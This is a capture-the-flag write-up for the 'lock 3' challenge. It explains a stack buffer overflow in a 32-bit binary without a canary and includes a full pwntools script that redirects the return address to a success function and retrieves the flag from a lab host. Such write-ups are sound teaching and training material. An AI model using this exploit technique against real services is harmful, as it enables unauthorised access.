# lock 3

## Challenge

Simple 32-bit binary with a string buffer overflow.

ASLR disabled.

### Checksec

```
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Solution

Since ASLR is off, we know the executable address even with PIE enabled.

We have a buffer overflow with no canary so we can overwrite the return address in `sym.lock_logic`.

By overwriting this address with the address of `sym.success`, we can print the flag without authenticating.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 10.0.1.33 --port 10003 lock3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('lock3')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '10.0.1.33'
port = int(args.PORT or 10003)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

exe.address = 0x56555000
payload = flat({
    0x6c + 0x4: exe.sym['success'],
    })

io.sendlineafter(b"Enter the password: ", payload)

io.recvuntil(b'Correct, the lock is open.\r\n')
print(io.recvuntil(b'\r\n', drop=True).decode())
```

## Flag

```
There are currently 178934 crates in the warehouse.
```
